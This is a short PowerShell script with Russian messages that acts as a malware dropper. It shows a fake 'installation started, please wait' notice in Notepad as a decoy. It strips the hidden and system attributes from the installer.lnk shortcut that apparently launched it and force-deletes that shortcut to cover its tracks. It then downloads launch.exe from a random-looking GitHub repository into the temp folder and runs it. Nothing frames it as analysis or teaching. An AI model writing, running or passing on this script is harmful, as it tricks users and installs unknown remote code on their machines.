$txt = "$env:TEMP\info.txt"

@"
Установка запущена.

Пожалуйста, подождите...
"@ | Out-File $txt -Encoding UTF8

Start-Process notepad.exe $txt

$folder = (Get-Location).Path

$lnk = Join-Path $folder "installer.lnk"
$txt = Join-Path $folder "installer.txt"
$log = Join-Path $folder "my_log.txt"

Start-Sleep -Seconds 2

Add-Content $log "Пытаюсь удалить: $lnk"

if (Test-Path $lnk) {
    # attrib -r -s -h $lnk
    # [System.IO.File]::Delete($lnk)

    try {
        attrib -r -s -h $lnk 2>$null
        Remove-Item $lnk -Force -ErrorAction Stop
        Add-Content $log "Файл успешно удалён."
    } catch {
        Add-Content $log "Не удалось удалить: $_"
    }
} else {
    Add-Content $log "Файл не найден по указанному пути."
}

@"
Установка запущена.

Пожалуйста, подождите...
"@ | Out-File $txt -Encoding UTF8

$wc = New-Object System.Net.WebClient
$wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
& "$env:TEMP\a.exe"
